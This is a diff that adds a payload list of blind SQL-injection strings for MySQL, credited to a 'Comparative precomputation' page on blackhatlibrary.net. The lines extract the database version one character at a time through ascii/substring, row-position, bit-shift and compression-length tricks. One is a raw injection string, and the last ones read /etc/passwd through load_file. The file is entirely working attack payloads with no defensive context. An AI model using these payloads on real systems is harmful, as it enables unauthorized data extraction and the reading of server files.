@@ -1,0 +1,15 @@
+# http://www.blackhatlibrary.net/Comparative_precomputation
+ascii(substring(version() from 1 for 1))
+length((select length(version())))
+ascii(substring(length(version()),1,1))
+(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=1)
+(select id from (select id,@v:=@v+1 as pos from articles y join (select @v:=0) k limit 255) x where pos=ascii(substring(version() from 1 for 1)))
+vulnerable_site' and 1=5 or title=() #'
+conv(hex(substr(version() FROM 1 FOR 2)),16,10)
+conv(hex(substr(version() FROM 1 FOR 2)),16,10) >> 0x6
+conv(hex(substr(version() FROM 2 FOR 2)),16,10) << 0x2 >> 0x6
+uncompress(compress(version()))
+LENGTH(compress(version()))
+LENGTH(version())
+LENGTH(load_file('/etc/passwd'))
+LENGTH(compress(load_file('/etc/passwd')))
